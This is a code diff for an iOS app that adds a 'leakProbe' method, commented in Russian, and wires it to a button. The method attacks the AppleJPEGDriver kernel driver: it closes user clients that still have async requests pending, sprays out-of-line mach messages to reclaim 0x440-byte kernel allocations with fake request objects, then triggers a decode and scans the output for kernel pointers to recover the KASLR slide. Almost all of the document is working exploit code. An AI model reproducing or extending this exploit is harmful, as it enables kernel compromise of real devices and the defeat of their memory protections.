@@ -139,7 +139,7 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
     self.panicButton.contentHorizontalAlignment = UIControlContentHorizontalAlignmentFill;
     self.panicButton.contentVerticalAlignment = UIControlContentVerticalAlignmentFill;
     self.panicButton.translatesAutoresizingMaskIntoConstraints = NO;
-    [self.panicButton addTarget:self action:@selector(panicPressed) forControlEvents:UIControlEventTouchUpInside];
+    [self.panicButton addTarget:self action:@selector(leakProbe) forControlEvents:UIControlEventTouchUpInside];
 
     // Status label
     self.statusLabel = [[UILabel alloc] init];
@@ -1354,4 +1354,96 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
     });
 }
 
+
+//
+//  leakProbe.m — добавляется в ViewController.m (v4)
+//  Метод: OOL fake-JpegRequest reclaim + sync-триггер + скан outStruct на kernel-указатели
+//  Цель: поймать живой KASLR slide (0xfffffff0......... в данных, вернувшихся из драйвера)
+//
+#import <mach/mach.h>
+
+- (void)leakProbe {
+    [self log:@"=== leakProbe (v4): OOL reclaim + kernel-ptr scan ==="];
+    io_service_t svc = [self findJPEGService];
+    if (!svc) { [self log:@"no service"]; return; }
+    BOOL healthy = [self checkDriverHealth:svc];
+    [self log:@"driver health: %@", healthy ? @"OK" : @"BROKEN"];
+    if (!healthy) { IOObjectRelease(svc); return; }
+
+    const uint32_t W = 2048, H = 2048;
+    NSData *jpegData = [self createTestJPEG:W height:H];
+    IOSurfaceRef srcSurf = [self createSourceSurface:jpegData];
+    IOSurfaceRef dstSurf = [self createDestSurface:W height:H];
+    if (!srcSurf || !dstSurf) { IOObjectRelease(svc); return; }
+    uint32_t srcID = IOSurfaceGetID(srcSurf);
+    uint32_t dstID = IOSurfaceGetID(dstSurf);
+
+    // OOL spray port: сообщения накапливаются, держат kalloc(0x440) живым
+    mach_port_t sprayPort = MACH_PORT_NULL;
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &sprayPort);
+    mach_port_insert_right(mach_task_self(), sprayPort, sprayPort, MACH_MSG_TYPE_MAKE_SEND);
+
+    int kptr_total = 0;
+    uint64_t slide = 0;
+    const int ROUNDS = 30;
+
+    for (int r = 0; r < ROUNDS; r++) {
+        // --- victim: async requests + close (оставляет stale указатели) ---
+        io_connect_t victim = [self openUC:svc];
+        if (victim) {
+            [self submitAsyncRequests:victim srcID:srcID dstID:dstID
+                width:W height:H count:5 tokenBase:0x4141 + r*0x10];
+            IOServiceClose(victim);
+        }
+
+        // --- reclaim 1: same-pool запросы (JpegRequest) ---
+        for (int x = 0; x < 3; x++) {
+            io_connect_t rc = [self openUC:svc];
+            if (!rc) continue;
+            [self submitAsyncRequests:rc srcID:srcID dstID:dstID
+                width:W height:H count:5 tokenBase:0xBEEF + r*0x10 + x];
+            IOServiceClose(rc);
+        }
+
+        // --- reclaim 2: OOL mach_msg 0x440 (fake JpegRequest, 'J'-паттерн) ---
+        [self sprayOOL:0x440 count:20 port:sprayPort];
+
+        // --- sync триггер: decode с валидными поверхностями ---
+        io_connect_t t = [self openUC:svc];
+        if (t) {
+            AppleJPEGDriverIOStruct in = {0}, out = {0};
+            in.sourceID = srcID; in.field_04 = W*H;
+            in.destID = dstID;  in.field_0C = W*H*4;
+            in.width = W; in.height = H; in.outWidth = W; in.outHeight = H;
+            in.subsampling = 3;
+            size_t os = sizeof(out);
+            kern_return_t kr = IOConnectCallStructMethod(t, 1, &in, sizeof(in), &out, &os);
+            if (kr != KERN_SUCCESS) { /* типично */ }
+            // сканируем возвращённые данные на kernel-указатели
+            uint8_t *raw = (uint8_t *)&out;
+            for (size_t i = 0; i + 8 <= os; i += 8) {
+                uint64_t v = 0;
+                memcpy(&v, raw + i, 8);
+                if ((v >> 32) == 0xfffffff0ULL && (v & 0xffffffffULL) != 0) {
+                    kptr_total++;
+                    [self log:@"  [r=%d] KPTR @out+%04zx = %#018llx", r, i, v];
+                    if (!slide) {
+                        uint64_t known_off = 0x18d8774ULL;
+                        if ((v & 0xfffULL) == ((0xfffffff007004000ULL + known_off) & 0xfffULL)) {
+                            slide = v - (0xfffffff007004000ULL + known_off);
+                            [self log:@"  --> KASLR slide = %#llx", slide];
+                            if (slide) goto done;
+                        }
+                    }
+                }
+            }
+            IOServiceClose(t);
+        }
+        if ((r+1) % 10 == 0) [self log:@"  round %d done, kptrs=%d", r+1, kptr_total];
+    }
+done:
+    mach_port_destroy(mach_task_self(), sprayPort);
+    CFRelease(srcSurf); CFRelease(dstSurf); IOObjectRelease(svc);
+    [self log:@"=== leakProbe done: kptrs=%d slide=%#llx ===", kptr_total, slide];
+}
 @end
